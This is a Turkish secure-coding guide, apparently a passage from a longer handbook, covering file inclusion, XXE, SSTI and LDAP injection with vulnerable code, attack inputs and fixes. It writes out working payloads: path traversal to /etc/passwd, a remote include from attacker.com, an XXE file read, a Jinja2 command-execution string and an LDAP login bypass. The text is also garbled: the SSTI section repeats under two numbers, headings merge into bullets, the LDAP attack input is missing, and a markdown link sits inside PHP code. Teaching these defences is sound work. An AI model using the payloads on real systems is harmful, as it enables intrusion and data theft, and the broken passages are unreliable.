*   Bir RCE açığının sıfırıncı gün (*Zero-Day*) senaryolarıyla kaçınılmaz olarak tetiklendiği durumlarda, saldırganın ana işletim sistemine sızmasını engellemek amacıyla izolasyon katmanları kurulmalıdır.
*   Web uygulamaları doğrudan ana sunucu (*Bare-Metal*) üzerinde değil, Docker gibi konteyner teknolojileri veya kısıtlı yetkilere sahip chroot hapishaneleri (*Sandbox*) içerisinde çalıştırılmalıdır.
*   Konteyner yapıları, işletim sisteminin çekirdeğine doğrudan erişemeyecek şekilde minimum kaynak yetkisiyle sınırlandırılmalıdır. Bu sayede saldırgan RCE zafiyetiyle kod çalıştırsa dahi, yalnızca izole edilmiş ve dış dünyadan soyutlanmış boş bir konteyner havuzunun içerisinde kalır; ana sunucu işletim sistemine, yerel ağdaki diğer sunuculara veya kritik veri tabanlarına erişim sağlayamaz.

---

# 5. Local File Inclusion (LFI) & Remote File Inclusion (RFI)

Uygulamanın dosya sisteminden dinamik olarak dosya çağıran, okuyan veya harici kaynakları sisteme dahil eden fonksiyonlarına (PHP'de `include`, `require`, `file_get_contents`; benzersiz olarak diğer dillerdeki dosya okuma API'leri) kullanıcıdan alınan girdi parametrelerini hiçbir doğrulamadan geçirmeden aktarması sonucu oluşan zafiyet ailesine **Dosya Dahil Etme (File Inclusion)** zafiyetleri denir.

Bu zafiyet, hedef alınan dosyanın konumuna göre iki alt başlığa ayrılır:
*   **Local File Inclusion (LFI):** Saldırganın, sunucunun yerel dosya sisteminde barınan ancak normal şartlarda erişmemesi gereken kritik sistem dosyalarını (örneğin Linux'ta `/etc/passwd`, Windows'ta `boot.ini` veya uygulamanın kaynak kodları ve veri tabanı konfigürasyon dosyaları) okumasına veya çalıştırmasına imkan tanır.
*   **Remote File Inclusion (RFI):** Saldırganın, harici bir sunucuda barındırdığı kötü niyetli bir betiği (*Web Shell*) uzak URL çağrısı vasıtasıyla hedef uygulamanın içerisine enjekte etmesine ve sunucu üzerinde doğrudan kod yürütmesine (RCE) olanak tanır.

---

## Dizin Atlama Karakterleri ve Teknik Anatomisi

*   **LFI saldırılarında** en sık başvurulan yöntem Dizin Atlama (*Directory Traversal / Path Traversal*) tekniğidir. İşletim sistemlerinde geçerli olan ve bir üst dizine geçmeyi sağlayan `../` (ya da Windows sistemler için `..\`) karakter dizileri, girdi alanlarına ardışık olarak enjekte edilerek uygulamanın kısıtlandığı kök dizinden dışarı çıkılır ve işletim sisteminin hassas dosyalarına ulaşılır.
*   **RFI saldırılarında** ise web sunucusunun ve programlama dilinin konfigürasyon yapısı (örneğin PHP'deki `allow_url_include` yapılandırması) harici adreslerden dosya çekilmesine izin veriyorsa, girdi alanına `http://`, `https://` veya `ftp://` protokolleri enjekte edilerek uzak sunucudaki kodlar yerel sunucuda derlettirilir.

---

## Kod Örnekleri

### Hatalı ve Savunmasız Kod (Vulnerable Code)

Aşağıdaki PHP örneğinde, web sitesinin sayfalarını veya dil dosyalarını URL üzerinden gelen `page` parametresine göre dinamik olarak yüklemek isteyen güvensiz bir tasarım yer almaktadır:
```php
<?php
// Kullanıcıdan yüklenecek sayfa adı girdisi alınıyor
$page =$_GET['page'];

// Kullanıcı girdisi hiçbir kontrolden geçmeden doğrudan dosya çağırma fonksiyonuna aktarılıyor
include("pages/" . $page . ".php");
?>
```
### LFI Saldırı Senaryosu

Saldırgan, `page` parametresine yasal bir sayfa adı yazmak yerine dizin atlama karakterlerini enjekte ederek sistem dosyasını hedef alır: 
`../../../../etc/passwd`

Bu durumda arka planda sunucunun çalıştırmaya zorlandığı nihai dosya yolu şu şekle bürünür:
```php
include("pages/../../../../etc/passwd.php");
```
> 💡 **Not:** Eski sistemlerde veya tırnak/uzantı sıfırlama tekniklerinde sondaki `.php` uzantısı null byte (`%00`) veya yol uzunluğu sınırlandırmalarıyla bypass edilebilmekteydi; modern sistemlerde ise doğrudan `/etc/passwd` içeriği okunmaya çalışılır.

Sunucu, dizin yapısından geriye doğru çıkarak sistemdeki kullanıcı listesini sızdırır.

---

### RFI Saldırı Senaryosu

Eğer sunucuda harici URL dahil etme özellikleri aktifse, saldırgan `page` parametresine kendi kontrolündeki bir adresi enjekte eder: 
`http://attacker.com/malicious_code`

Nihai komut yapısı harici kaynağı sisteme yükler:
```php
include("pages/[http://attacker.com/malicious_code.php](http://attacker.com/malicious_code.php)");
```
Sunucu, uzak adresteki PHP kodlarını kendi hafızasına alır ve çalıştırır. Bu durum saldırının doğrudan **Remote Code Execution (RCE)** zafiyetine evrilmesine neden olur.

---

## Doğru ve Güvenli Kod (Secure Code)

File Inclusion zafiyetlerini önlemenin en kesin ve radikal yolu, kullanıcıdan alınan dinamik metinlerin doğrudan dosya sistemi fonksiyonlarına parametre olarak geçilmesini engellemektir. Dinamik dosya yükleme operasyonlarında kullanıcı girdisi yerine katı bir **Beyaz Liste (Whitelist)** mimarisi kurulmalıdır.
```php
<?php
// Kullanıcıdan alınacak parametre kısıtlanıyor
$page =$_GET['page'];

// Sadece yüklenmesine izin verilen statik dosyaların yer aldığı kesin bir beyaz liste oluşturulur
$allowedPages = [
    'home'    => 'pages/home.php',
    'about'   => 'pages/about.php',
    'contact' => 'pages/contact.php'
];

// Kullanıcının girdisi beyaz listede aranır
if (array_key_exists($page,$allowedPages)) {
    // Kullanıcı girdisi değil, listedeki güvenli ve sabit dosya yolu fonksiyona aktarılır
    include($allowedPages[$page]);
} else {
    // Tanımsız veya zararlı bir girdi geldiğinde varsayılan güvenli sayfa yüklenir
    include('pages/home.php');
}
?>
```
## Savunma Katmanları (Defense-in-Depth)

Sistem mimarisini dosya dahil etme saldırılarına karşı korunaklı hale getirmek adına şu ek güvenlik katmanları entegre edilmelidir:

### 1. Girdi Temizleme ve Sadece Dosya Adı Ayıklama (Path Isolation)
Eğer bir beyaz liste kullanılması mümkün değilse ve dosyaların dinamik bir klasör içerisinden okunması zorunluysa, gelen girdinin içerisindeki tüm dizin yapıları temizlenmelidir. `basename()` gibi fonksiyonlar, girdinin önündeki tüm klasör ve dizin atlama (`../`) yollarını ayıklayarak geriye sadece saf dosya adını bırakır.
```php
<?php
$page =$_GET['page'];

// basename fonksiyonu girdi içerisindeki tüm dizin geçişlerini ve "../" yollarını temizler
// Örneğin "../../../../etc/passwd" girdisi sadece "passwd" haline getirilir
$securePage = basename($page);

include("pages/" . $securePage . ".php");
?>
```
### 2. Dil ve Sunucu Seviyesinde Konfigürasyon Sıkılaştırma

Uzak sunuculardan kod enjekte edilmesini (RFI) engellemek amacıyla, web sunucusunun çalışma zamanı ayarları optimize edilmelidir. PHP mimarisi için `php.ini` dosyası içerisinde yer alan şu direktifler kesin olarak kapatılmalıdır:
```ini
# Harici URL'lerin include/require fonksiyonları ile çağrılmasını tamamen kapatır
allow_url_include = Off

# Harici URL'lerin dosya okuma fonksiyonları ile çağrılmasını kısıtlar
allow_url_fopen = Off
```
### 3. İşletim Sistemi Seviyesinde Yetki Kısıtlaması (chroot ve open_basedir)

Uygulamada bir LFI açığı meydana gelse dahi, sızan kullanıcının işletim sisteminin diğer hassas dizinlerine erişmesini engellemek için erişim kontrolleri sıkılaştırılmalıdır:

*   **open_basedir Yapılandırması:** PHP uygulamalarında `open_basedir` direktifi kullanılarak, uygulamanın dosya fonksiyonları ile erişebileceği alanlar sadece web kök dizini (`/var/www/html/`) ile sınırlandırılmalıdır. Bu sınırlandırma sayesinde uygulama kodları `/etc/` veya `/var/log/` gibi sistem dizinlerine erişemez.
*   **chroot Hapishanesi (Jail):** Web sunucusu süreci işletim sisteminde chroot yapısı ile izole edilmelidir. Bu sayede web uygulamasının gördüğü dosya sisteminin en üst kök dizini (`/`) aslında sistemin gerçek kökü değil, sadece kendisi için ayrılmış yapay bir klasör olur. Saldırgan dizin atlama karakterleri kullansa bile bu sanal sınırın dışına çıkamaz.
*   # 6. XML External Entity (XXE) Injection

Uygulamanın XML (Extensible Markup Language) formatındaki girdileri işlerken, XML standartlarının bir parçası olan harici varlık (*External Entity*) ve doküman tipi tanımlama (DTD - *Document Type Definition*) özelliklerini güvensiz bir şekilde çözümlemesi sonucu ortaya çıkan zafiyet türüne **XML External Entity Injection** denir.

Bu enjeksiyon türünde saldırgan, sunucuya gönderdiği XML verisinin içerisine kötü niyetli yapılandırmalar ekleyerek XML ayrıştırıcısını (*XML Parser*) manipüle eder. XXE zafiyetinin sömürülmesi; sunucunun yerel dosya sistemindeki hassas verilerin okunmasına, sunucu arkasındaki iç ağa sızarak diğer sistemlerin taranmasına (SSRF - *Server-Side Request Forgery*), servis dışı bırakma saldırılarına (DoS) ve bazı özel senaryolarda uzaktan kod çalıştırılmasına (RCE) yol açar.

---

## DTD ve Harici Varlıkların Teknik Anatomisi

XML verilerinde, dokümanın yapısını ve kabul edeceği kuralları belirlemek için DTD yapısı kullanılır. DTD içerisinde tanımlanan varlıklar (*Entities*), programlama dillerindeki değişkenlere benzer. XML içerisindeki bir harici varlık, sunucuya yerel bir dosya yolunu veya uzak bir URL adresini hedef gösterebilir.

Saldırganlar, XML verisini işleyen parser motoruna şu iki temel mekanizmayı kullanarak saldırırlar:

*   **SYSTEM Anahtar Kelimesi:** XML ayrıştırıcısına, tanımlanan varlığın içeriğini harici bir kaynaktan (yerel dosya sistemi veya ağ üzerindeki bir adres) okuması talimatını verir.
*   **OOB (Out-of-Band) Veri Sızdırma:** Sunucu çıktısında XML verisinin sonucu doğrudan kullanıcıya gösterilmiyorsa (*Blind XXE*), saldırgan harici DTD çağrıları ile sunucunun dış dünyadaki kendi kontrolündeki bir sunucuya HTTP/DNS isteği atmasını sağlar ve veriyi bu isteklerin parametrelerine gizleyerek sızdırır.

---

## Kod Örnekleri

### Hatalı ve Savunmasız Kod (Vulnerable Code)

Aşağıdaki PHP örneğinde, kullanıcıdan gelen XML formatındaki veriyi (örneğin bir API isteği veya konfigürasyon yüklemesi) çözümleyen bir yapı yer almaktadır. Yazılımcı, PHP'nin yerleşik XML kütüphanesini kullanırken dış varlık çözümleme özelliklerini kapatmamıştır:
```php
<?php
// Kullanıcıdan ham XML verisi alınıyor
$xmlData = file_get_contents('php://input');

// XML kütüphanesinin nesnesi oluşturuluyor
$document = new DOMDocument();

// Güvensiz Yapılandırma: LIBXML_NOENT parametresi harici varlıkların çözümlenmesini sağlar
// LIBXML_DTDLOAD parametresi ise DTD yüklenmesini aktif kılar
$document->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);

// XML içerisindeki veri okunuyor
$userData = simplexml_import_dom($document);
echo "Hoş geldiniz, " . $userData->username;
?>
```
### Saldırı Senaryosu (Dosya Okuma)

Saldırgan, HTTP isteğinin gövdesine (Body) normal bir XML verisi göndermek yerine, DTD alanında `SYSTEM` direktifi ile işletim sisteminin kritik dosyasını işaret eden bir harici varlık tanımlar ve bu varlığı XML gövdesinde çağırır:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
</user>
```
XML ayrıştırıcısı veriyi işlerken `&xxe;` ifadesini gördüğü an, sunucunun yerel dosya sistemine giderek `/etc/passwd` dosyasının içeriğini okur ve bu içeriği `username` değişkeninin yerine koyar. Uygulama çıktı olarak kullanıcı listesini ekrana basar.

---

## Doğru ve Güvenli Kod (Secure Code)

XXE enjeksiyonlarını önlemenin en kesin ve birincil yolu, XML ayrıştırıcı motorlarında harici varlık (*External Entity*) çözümlemeyi ve harici DTD (*Document Type Definition*) yükleme özelliklerini mimari seviyede tamamen devre dışı bırakmaktır.
Farklı diller ve framework yapıları için de varsayılan XML yapılandırmaları benzer şekilde sıkılaştırılmalıdır. Örneğin Java mimarisinde `DocumentBuilderFactory` nesnesi kullanılırken `setFeature("http://xml.org/sax/features/external-general-entities", false)` ve `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` kuralları işletilerek zafiyet tamamen kapatılmalıdır.

---

## Savunma Katmanları (Defense-in-Depth)

XML tabanlı mimarilerde güvenliği pekiştirmek amacıyla uygulanması gereken derinlemesine savunma ilkeleri şunlardır:

### 1. XML Kütüphanelerini ve Çözümleyicilerini Güncel Tutmak
XXE zafiyetleri, doğrudan kullanılan programlama dillerinin yerleşik XML kütüphanelerinin veya üçüncü parti XML bağımlılıklarının eski versiyonlarındaki varsayılan yapılandırma hatalarından kaynaklanır. Eski kütüphanelerde harici varlık çözümleme özellikleri genellikle varsayılan olarak açık gelmektedir. Çekirdek sistemlerin ve XML kütüphanelerinin güncel tutulması, bu varsayılan güvensiz ayarların kapatılmış olarak gelmesini sağlar.

### 2. Girdi Doğrulama, Filtreleme ve JSON Alternatifi
*   **Veri Formatı Değişimi:** Uygulama mimarisinde XML kullanımı teknik bir zorunluluk değilse, veri transfer formatı olarak JSON tercih edilmelidir. JSON yapısı doğası gereği harici varlık tanımlamaları veya DTD gibi tehlikeli genişleme özelliklerini barındırmadığından XXE saldırı yüzeyini tamamen ortadan kaldırır.
*   **Girdi Filtreleme:** XML kabul edilmek zorundaysa, gelen ham veri daha parser motoruna ulaşmadan önce `<!DOCTYPE` veya `<!ENTITY` gibi kritik anahtar kelimelerin varlığına karşı sıkı bir kontrole tabi tutulmalı, bu ifadeleri içeren istekler güvenlik duvarı veya uygulama katmanında anında reddedilmelidir.

### 3. WAF (Web Application Firewall) Kuralları ve Ağ Kısıtlamaları
*   **WAF İmzaları:** Web Uygulama Güvenlik Duvarı üzerinde, HTTP istek gövdelerinde XXE saldırı kalıplarını (örneğin `SYSTEM`, `PUBLIC`, `file://`, `http://` içeren DTD blokları) tespit eden kurallar aktif edilmelidir.
*   **Dışa Doğru Ağ Kısıtlaması (Egress Filtering):** XXE sömürülerinde, özellikle Blind XXE senaryolarında, sunucunun saldırgana ait harici bir sunucuya bağlantı kurması (HTTP/DNS) gerekir. Sunucunun dış dünyaya doğru yapabileceği ağ istekleri (*Egress Traffic*) güvenlik duvarı seviyesinde sadece izin verilen güvenli adreslerle sınırlandırılmalıdır. Bu sayede sunucu XXE ile manipüle edilse dahi, dışarıdaki bir adrese veri sızdıramaz ve ağ taraması (SSRF) yapamaz.
*   8. Server-Side Template Injection (SSTI)
Uygulamanın kullanıcıdan aldığı girdileri, dinamik web sayfaları üretmek amacıyla kullanılan şablon motorlarına (Template Engines) güvenli bir parametre olarak aktarmak yerine, doğrudan şablon metninin (string) içerisine eklemesi sonucu ortaya çıkan kritik zafiyet türüne Server-Side Template Injection denir.
Bu zafiyette saldırgan, şablon motorlarının (örneğin PHP'de Twig/Smarty, Python'da Jinja2/Mako, Java'da Thymeleaf/FreeMarker, Node.js'te Pug/EJS) sözdizimi kurallarını kullanarak girdi alanlarına kendi kodlarını enjekte eder. Şablon motoru, bu girdiyi bir metin bileşeni olarak değil, derlenmesi ve yürütülmesi gereken bir programlama talimatı olarak algılar. SSTI zafiyetinin sömürülmesi; sunucu tarafındaki gizli uygulama nesnelerine erişilmesine, hassas yapılandırma dosyalarının okunmasına ve nihai aşamada sunucu üzerinde doğrudan Uzaktan Kod Çalıştırılmasına (RCE) yol açar.
Şablon Motorları ve Teknik Anatomisi
Modern web mimarilerinde şablon motorları, kaynak kod ile tasarım katmanını (HTML) birbirinden ayırır. Şablon motorları, çift süslü parantez {{ ... }} veya yüzde işaretleri {% ... %} gibi özel karakter kalıplarını görerek içerideki ifadeleri dinamik olarak çalıştırır.
Saldırganlar sisteme müdahale ederken şu aşamaları izlerler:
Zafiyet Tespiti ve Motor Keşfi: Saldırgan, girdi alanlarına matematiksel ifadeler enjekte eder (örneğin {{ 7*7 }} veya ${7*7}). Eğer sunucudan dönen yanıtta 49 değeri görülüyorsa, şablon enjeksiyonunun varlığı kesinleşir. Ardından, farklı motorların hata mesajları ve sözdizimi farkları incelenerek arka planda hangi teknolojinin çalıştığı saptanır.
Nesne Ağacı Sömürüsü (MRO / Reflection): Motor tespit edildikten sonra, o dilin ve motorun yerleşik nesne yapısı manipüle edilir. Örneğin Python tabanlı Jinja2 motorunda, boş bir string üzerinden .__class__.__mro__ gibi nitelikler çağrılarak uygulamanın üst sınıflarına (object), oradan da işletim sistemi komutlarını tetikleyebilen subprocess.Popen gibi tehlikeli modüllere zincirleme erişim sağlanır.
Kod Örnekleri
Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki Python ve Flask örneğinde, kullanıcıya özel bir karşılama mesajı üretmek isteyen güvensiz bir yapı yer almaktadır. Yazılımcı, kullanıcı girdisini şablonun çalışma zamanı parametresi yapmak yerine, doğrudan şablon string'inin içerisine gömmüştür
# 7. Server-Side Template Injection (SSTI)

Uygulamanın kullanıcıdan aldığı girdileri, dinamik web sayfaları üretmek amacıyla kullanılan şablon motorlarına (*Template Engines*) güvenli bir parametre olarak aktarmak yerine, doğrudan şablon metninin (*string*) içerisine eklemesi sonucu ortaya çıkan kritik zafiyet türüne **Server-Side Template Injection** denir.

Bu zafiyette saldırgan, şablon motorlarının (örneğin PHP'de Twig/Smarty, Python'da Jinja2/Mako, Java'da Thymeleaf/FreeMarker, Node.js'te Pug/EJS) sözdizimi kurallarını kullanarak girdi alanlarına kendi kodlarını enjekte eder. Şablon motoru, bu girdiyi bir metin bileşeni olarak değil, derlenmesi ve yürütülmesi gereken bir programlama talimatı olarak algılar. SSTI zafiyetinin sömürülmesi; sunucu tarafındaki gizli uygulama nesnelerine erişilmesine, hassas yapılandırma dosyalarının okunmasına ve nihai aşamada sunucu üzerinde doğrudan Uzaktan Kod Çalıştırılmasına (RCE) yol açar.

---

## Şablon Motorları ve Teknik Anatomisi

Modern web mimarilerinde şablon motorları, kaynak kod ile tasarım katmanını (HTML) birbirinden ayırır. Şablon motorları, çift süslü parantez `{{ ... }}` veya yüzde işaretleri `{% ... %}` gibi özel karakter kalıplarını görerek içerideki ifadeleri dinamik olarak çalıştırır.

Saldırganlar sisteme müdahale ederken şu aşamaları izlerler:

*   **Zafiyet Tespiti ve Motor Keşfi:** Saldırgan, girdi alanlarına matematiksel ifadeler enjekte eder (örneğin `{{ 7*7 }}` veya `${7*7}`). Eğer sunucudan dönen yanıtta `49` değeri görülüyorsa, şablon enjeksiyonunun varlığı kesinleşir. Ardından, different motorların hata mesajları ve sözdizimi farkları incelenerek arka planda hangi teknolojinin çalıştığı saptanır.
*   **Nesne Ağacı Sömürüsü (MRO / Reflection):** Motor tespit edildikten sonra, o dilin ve motorun yerleşik nesne yapısı manipüle edilir. Örneğin Python tabanlı Jinja2 motorunda, boş bir string üzerinden `.__class__.__mro__` gibi nitelikler çağrılarak uygulamanın üst sınıflarına (`object`), oradan da işletim sistemi komutlarını tetikleyebilen `subprocess.Popen` gibi tehlikeli modüllere zincirleme erişim sağlanır.

---

## Kod Örnekleri

### Hatalı ve Savunmasız Kod (Vulnerable Code)

Aşağıdaki Python ve Flask örneğinde, kullanıcıya özel bir karşılama mesajı üretmek isteyen güvensiz bir yapı yer almaktadır. Yazılımcı, kullanıcı girdisini şablonun çalışma zamanı parametresi yapmak yerine, doğrudan şablon string'inin içerisine gömmüştür:
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/welcome")
def welcome():
    # Kullanıcıdan gelen isim parametresi alınıyor
    user_name = request.args.get('name', 'Misafir')

    # GÜVENSİZ YAPI: Kullanıcı girdisi doğrudan şablon metninin içine yapıştırılıyor
    template = f"<html><body><h1>Hoş geldiniz, {user_name}!</h1></body></html>"

    # Şablon motoru, içinde kullanıcı girdisi barındıran bu metni doğrudan derliyor
    return render_template_string(template)

if __name__ == "__main__":
    app.run()
```
### Saldırı Senaryosu (RCE)

Saldırgan, `name` parametresine düz bir isim yazmak yerine Jinja2 motorunun nesne rotasyon yeteneklerini kullanan şu zararlı girdi kodunu enjekte eder: 
`{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`

Uygulamanın arka planda birleştirdiği ve derlemeye zorlandığı nihai şablon yapısı şu şekle bürünür:

```html
<html><body><h1>Hoş geldiniz, {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}!</h1></body></html>
```
Jinja2 şablon motoru, süslü parantezler içerisindeki ifadeyi çalıştırırken Python'ın `os` modülünü yükler ve işletim sisteminde `id` komutunu yürütür. Çıkan sonuç HTML sayfasına dahil edilerek saldırgana gösterilir.

---

## Doğru ve Güvenli Kod (Secure Code)

SSTI zafiyetini önlemenin tek kesin yolu, kullanıcıdan alınan verileri asla şablon kaynak kodunun (*Template String*) içerisine doğrudan dahil etmemektir. Şablon kodları statik olarak tanımlanmalı, kullanıcı verileri ise şablon motorunun sunduğu yerleşik parametreleştirme (*Context/Data Passing*) mimarisiyle motora "veri" olarak aktarılmalıdır.

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/welcome")
def welcome():
    # Kullanıcıdan gelen isim parametresi alınıyor
    user_name = request.args.get('name', 'Misafir')

    # GÜVENLİ YAPI: Şablon metni tamamen statik ve sabittir
    # Dinamik gelecek olan veri yer tutucu (placeholder) bir değişken ile belirtilir
    template = "<html><body><h1>Hoş geldiniz, {{ name_param }}!</h1></body></html>"
    
    # Kullanıcı girdisi şablon motoruna güvenli bir context değişkeni olarak paslanıyor
    # Bu mimaride name_param içerisine ne yazılırsa yazılsın sadece düz bir metin olarak basılır
    return render_template_string(template, name_param=user_name)

if __name__ == "__main__":
    app.run()

```
## Savunma Katmanları (Defense-in-Depth)

Şablon tabanlı mimarilerde güvenliği pekiştirmek adına şu ek koruma katmanları devreye alınmalıdır:

### 1. Girdi Doğrulama ve Sıkı Beyaz Liste Kontrolü
Uygulamaya kabul edilecek kullanıcı girdileri, şablon motorlarının özel karakter sözdizimlerine karşı taranmalıdır. Eğer parametre alanında süslü parantezler (`{`, `}`), dolar işareti (`$`), yüzde işareti (`%`) veya nokta (`.`) gibi nesne erişim karakterlerinin bulunması iş mantığı açısından gerekmiyorsa, bu karakterleri içeren istekler düzenli ifadeler (Regex) ile daha en başta filtrelenmeli ve reddedilmelidir.

### 2. Mantıksız (Logic-less) Şablon Motorlarının Tercih Edilmesi
Eğer uygulamanın tasarım katmanında gelişmiş döngülere, nesne fonksiyon çağrılarına veya programlama dili metotlarına ihtiyaç duyulmuyorsa, mimari olarak "Logic-less" (Mantıksal yeteneği kısıtlı) şablon motorları (örneğin Mustache veya Handlebars) tercih edilmelidir. Bu motorlar, yapıları gereği karmaşık kod bloklarını veya sistem sınıflarını çalıştırma yeteneğine sahip olmadıklarından, enjeksiyon durumlarında bile siber saldırganların RCE elde etmesini engeller.

### 3. Uygulama İzolasyonu ve Kısıtlı Çalışma Zamanı (Sandboxing)
Şablon motorlarının çalıştırıldığı sunucu süreçleri ve uygulama katmanları izole edilmelidir:

*   **Korumalı Alan (Sandbox Mode):** Kullanılan şablon motorunun eğer mevcutsa güvenli çalışma modu (örneğin Twig için *Sandbox Extension*) aktif edilmelidir. Bu mod, şablonlar içerisinde sadece belirli güvenli fonksiyonların ve etiketlerin çalıştırılmasına izin verir, sunucu sınıflarına erişimi engeller.
*   **İşletim Sistemi İzolasyonu:** Uygulama, en az yetki ilkesine uygun olarak sistemde root haklarına sahip olmayan düşük yetkili bir kullanıcı ile çalıştırılmalı ve Docker benzeri bir konteyner yapısı içinde izole edilmelidir. Böylece bir enjeksiyon açığı yaşansa dahi, saldırganın ana sunucu işletim sistemine sızması ve kalıcı zarar vermesi sınırlandırılmış olur.
*   # 8. LDAP Injection

Uygulamanın kullanıcıdan aldığı girdileri, kurumsal dizin servislerini (Active Directory, OpenLDAP vb.) sorgulamak amacıyla arkada çalışan dinamik LDAP (Lightweight Directory Access Protocol) filtrelerinin içerisine güvenli bir süzgeçten geçirmeden dahil etmesi sonucu oluşan zafiyet türüne **LDAP Injection** denir.

Bu enjeksiyon türünde saldırgan, LDAP protokolünün arama filtrelerinde kullandığı özel kontrol karakterlerini girdi alanlarına enjekte ederek sorgunun mantıksal yapısını manipüle eder. LDAP Injection zafiyetinin sömürülmesi; kimlik doğrulama (*bypassing authentication*) mekanizmalarının aşılmasına, dizin servisinde kayıtlı hassas kurumsal bilgilerin (kullanıcı listeleri, e-posta adresleri, rol yetkileri, sistem grupları) sızdırılmasına ve yetkisiz erişim hakları elde edilmesine yol açar.

---

## LDAP Sorgu Yapısı ve Teknik Anatomisi

LDAP filtreleri, Polonyalı Notasyonu (*Prefix Notation*) adı verilen bir sözdizimi mimarisi kullanır. Bu mimaride mantıksal operatörler (VE, VEYA, DEĞİL) parametrelerin önüne yazılır ve tüm sorgu parantezler `( )` yardımıyla yapılandırılır.

Sorgu oluşturulurken kullanılan en kritik kontrol karakterleri şunlardır:

*   **& (Mantıksal VE):** Parantez içerisindeki tüm koşulların doğru olmasını zorunlu kılar.
*   **| (Mantıksal VEYA):** Parantez içerisindeki koşullardan en az birinin doğru olmasını yeterli görür.
*   **! (Mantıksal DEĞİL):** Belirtilen koşulun tam tersini doğrular.
*   *** (Wildcard / Joker Karakter):** Herhangi bir karakter dizisiyle eşleşmeyi sağlar. Arama alanlarında sızıntı yapmak için sıklıkla kullanılır.

Saldırganlar, parantez kapatma `)` veya açma `(` karakterlerini kullanarak sunucunun asıl çalıştırmak istediği mantıksal blokları erkenden sonlandırır ve sorgunun geri kalanını etkisiz hale getirerek kendi filtrelerini devreye sokarlar.

---

## Kod Örnekleri

### Hatalı ve Savunmasız Kod (Vulnerable Code)

Aşağıdaki PHP örneğinde, bir kurumsal portalın giriş panelinde kullanıcı adı ve şifreyi LDAP dizin servisi üzerinden doğrulamak isteyen güvensiz bir uygulama yapısı yer almaktadır:
```php
<?php
// Kullanıcıdan gelen giriş bilgileri doğrudan alınıyor
$user = $_POST['username'];
$pass = $_POST['password'];

// Dinamik LDAP arama filtresi string birleştirme yöntemiyle oluşturuluyor
// userPassword alanı şifreli veya açık metin olarak dizinde karşılaştırılmak isteniyor
$ldapFilter = "(&(uid=" . $user . ")(userPassword=" . $pass . "))";

// Güvensiz sorgu LDAP dizin sunucusuna gönderiliyor
$search = ldap_search($ldapConn, "ou=users,dc=company,dc=com", $ldapFilter);
?>
```
(&(uid=admin)(uid=*))(*)(userPassword=şifre))
LDAP sözdizimi kurallarına göre, sorgu motoru ilk mantıksal parantez bloğu olan `(&(uid=admin)(uid=*))` kısmını geçerli bir tam sorgu olarak değerlendirir. Hemen yanına gelen `(*)` ifadesi ise joker karakter mantığıyla her zaman "Doğru (True)" sonucunu üretir. Sorgunun geri kalanında kalan orijinal şifre kontrol kısmı `((userPassword=...)` ise geçersiz kılınarak boşa düşer. Dizin servisi, şifre kontrolünü gerçekleştirmeden "admin" kullanıcısının başarıyla doğrulandığı bilgisini uygulamaya döner ve saldırgan panele yetkisiz giriş sağlar.

---

## Doğru ve Güvenli Kod (Secure Code)

LDAP Injection saldırılarını önlemenin en etkili yolu, kullanıcıdan alınan verileri dinamik olarak filtre string'ine eklemeden önce kesinlikle dile ve protokole özgü Kaçış Karakteri (*LDAP Escaping*) işlemlerinden geçirmektir. Bu işlem, kullanıcının gönderdiği parantez veya yıldız gibi özel karakterleri anlamlı birer kontrol komutu olmaktan çıkarıp saf birer metin verisine dönüştürür.
```php
<?php
$user = $_POST['username'];
$pass = $_POST['password'];

// GÜVENLİ YAPI: Kullanıcı girdileri LDAP arama filtreleri için escape işlemine tabi tutuluyor
// ldap_escape fonksiyonu LDAP_ESCAPE_FILTER parametresiyle kullanıldığında 
// *, (, ), \, ve NULL karakterlerini güvenli hexadecimal (\28, \29 vb.) karşılıklarına çevirir.
$secureUser = ldap_escape($user, null, LDAP_ESCAPE_FILTER);
$securePass = ldap_escape($pass, null, LDAP_ESCAPE_FILTER);

// Güvenli hale getirilen değişkenlerle filtre oluşturuluyor
$ldapFilter = "(&(uid=" . $secureUser . ")(userPassword=" . $securePass . "))";

$search = ldap_search($ldapConn, "ou=users,dc=company,dc=com", $ldapFilter);
?>
```
Eğer Java ve JNDI (Java Naming and Directory Interface) mimarisi kullanılıyorsa, SQL'deki *prepared statements* yapısına benzer şekilde parametreli arama metotları (`search(String name, String filterExpr, Object[] filterArgs, SearchControls ctls)`) tercih edilerek enjeksiyon riskleri mimari olarak tamamen ortadan kaldırılmalıdır.

---

## Savunma Katmanları (Defense-in-Depth)

Kurumsal dizin mimarilerinde güvenliği pekiştirmek amacıyla uygulanması gereken derinlemesine savunma ilkeleri şunlardır:

### 1. Sıkı Girdi Doğrulama ve Beyaz Liste (Whitelisting)
Kullanıcı adı veya arama terimleri gibi alanlara kabul edilecek karakter setleri sınırlandırılmalıdır. Giriş panellerinde sadece alfanumerik karakterlerin (A-Z, 0-9) kabul edilmesi iş mantığı açısından yeterlidir. Girdi, sunucu tarafında düzenli ifadeler (Regex) ile taranmalı; içerisindeki özel karakterler (`*`, `(`, `)`, `&`, `|`, `=`, `!`) tespit edildiğinde istek daha LDAP sunucusuna ulaşmadan anında reddedilmelidir.

### 2. En Az Yetki İlkesi (Dizin Bağlantı Sınırlandırması)
Web uygulamasının, Active Directory veya OpenLDAP sunucusuna bağlanırken (*LDAP Bind*) kullandığı servis hesabının (*Service Account*) yetkileri olabildiğince kısıtlı olmalıdır:
*   Uygulama yalnızca kullanıcı doğrulama ve arama yapıyorsa, kullanılan servis hesabına dizin üzerinde yazma (*Write*), silme (*Delete*) veya şema değiştirme (*Alter Schema*) yetkileri kesinlikle verilmemelidir.
*   Servis hesabının okuma yetkisi, dizinin tamamını kapsayacak şekilde kökten (`dc=company,dc=com`) değil, sadece ilgili kullanıcı birimi (`ou=users`) ile sınırlandırılmalıdır. Bu sayede bir enjeksiyon açığı meydana gelse dahi, saldırganın kurumsal ağaçtaki sistem gruplarını veya kritik admin rollerini listelemesi engellenir.

### 3. Güvenli Hata Yönetimi ve Bilgi Sızıntısının Önlenmesi
